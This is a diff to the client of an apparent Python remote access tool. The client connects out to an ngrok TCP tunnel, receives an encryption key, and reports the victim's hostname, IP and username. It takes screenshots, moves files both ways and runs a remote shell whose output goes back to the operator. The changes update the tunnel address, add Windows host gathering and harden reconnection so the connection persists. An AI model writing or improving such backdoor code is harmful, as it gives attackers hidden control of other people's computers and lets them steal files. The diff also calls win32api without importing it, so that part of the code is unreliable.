@@ -1,27 +1,19 @@
-import socket
-import os
-import time
-import subprocess
-import mss
-import rsa
-import threading
-import select
+import socket, os, time, subprocess, mss, rsa
 from cryptography.fernet import Fernet 
 
-
-
-address = ("0.tcp.ngrok.io", 10883)
+address = ("2.tcp.ngrok.io", 11115)
 ping_address = ("0.0.0.0", 4001)
 authed = False
+
 
 # Connection and data transfer related functions
 def establish_connection(address=address):
     global server_con, authed, lck
     public_key, private_key = rsa.newkeys(512)
 
+    print("attempting to establish secure connection...")
     while not authed:
         try:
-            print("attempting to establish secure connection...")
             server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_con.connect((address[0],address[1]))
 
@@ -33,18 +25,23 @@ def establish_connection(address=address):
                 key = rsa.decrypt(encrypted_key_buff, private_key)
                 lck = Fernet(key)
                 authed = True
+                
                 send_sys_info()
                 print(f"Connection Established! Server: {address[0]}:{address[1]}")
                 return server_con
             else:
                 close_connection(sock=server_con)
+                time.sleep(10)
 
         except ConnectionRefusedError:
+            print("establish_connection(): Connection Refused")
             time.sleep(5)
 
-        # except:
-        #     print("Breaking")
-        #     close_connection(sock=server_con)
+        except Exception as e:
+            print("establish_connection(): exception occurred")
+            print(e)
+            close_connection(sock=server_con)
+
 
 
 def recv(time_out=None, sock=None, is_authed=None, buff_size=1024):
@@ -52,10 +49,9 @@ def recv(time_out=None, sock=None, is_authed=None, buff_size=1024):
     data_size = sock.recv(12)
     if not data_size:
         return None
-
+    
     data_buff = bytes()
-    data_size = int(data_size)
-    while len(data_buff) < data_size:
+    while len(data_buff) < int(data_size):
         data_buff += sock.recv(buff_size)
 
     sock.settimeout(None)
@@ -65,9 +61,10 @@ def recv(time_out=None, sock=None, is_authed=None, buff_size=1024):
 def send(data, sock=None, is_authed=None, header_size=12):
     if not data:
          return
-    
+
     if is_authed:
         data = encrypt(data)
+    
     data_size = f"{len(data):<{header_size}}"
     sock.sendall(data_size.encode()+data)
 
@@ -124,7 +121,10 @@ def take_screen_shot():
 
 def send_sys_info():
     global server_con, authed
-    device_info = f"""Client Name: {os.uname().nodename}&Local IP: {socket.gethostbyname(os.uname().nodename)}&User: {os.getlogin()}&Password: {'Dunno🤷🏻‍♂️'}"""
+    if os.name == "nt":
+        device_info = f"""Client Name: {win32api.GetComputerName()}&User: {win32api.GetUserName()}&Password: {'Dunno🤷🏻‍♂️'}"""
+    else: 
+        device_info = f"""Client Name: {os.uname().nodename}&Local IP: {socket.gethostbyname(os.uname().nodename)}&User: {os.getlogin()}&Password: {'Dunno🤷🏻‍♂️'}"""
     send(sock=server_con, data=device_info.encode(), is_authed=authed)
 
 def upload_file(file_name):
@@ -137,9 +137,9 @@ def upload_file(file_name):
     except FileNotFoundError:
         print("Error, file not found")
 
-def download_file(file_name, file_path):
+def download_file(file_name, file_path, buff_size=524288):
     try:
-        file_data = recv(buff_size=65538, time_out=15, sock=server_con, is_authed=authed)
+        file_data = recv(buff_size=buff_size, time_out=15, sock=server_con, is_authed=authed)
         
         if file_data:
             file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
@@ -147,9 +147,11 @@ def download_file(file_name, file_path):
             file.close()
         else:
             print("Error, couldn't download the file.")
-            
+
     except socket.timeout:
         print("Could not download file. Connection timed out.")
+
+
 
 
 def open_shell():
@@ -194,6 +196,7 @@ def open_shell():
     
         if not cmd_output_buff:
             cmd_output_buff = b'%%NONE%%'
+
         send(sock=server_con, data=cmd_output_buff, is_authed=authed)
 
 
@@ -222,14 +225,15 @@ def main():
             elif choice == b"4":
                 keep_alive = recv(sock=server_con, is_authed=authed).decode().lower()
                 if keep_alive == 'y' or keep_alive == 'yes':
-                    server_con = reset_connection(time_out=15)
+                    server_con = reset_connection()
                 else:
                     break
 
         except KeyboardInterrupt:
             break
 
-        except:
+        except (ConnectionError, OSError, socket.error) as e:
+            print(e)
             server_con = reset_connection()
 
     close_connection(sock=server_con)
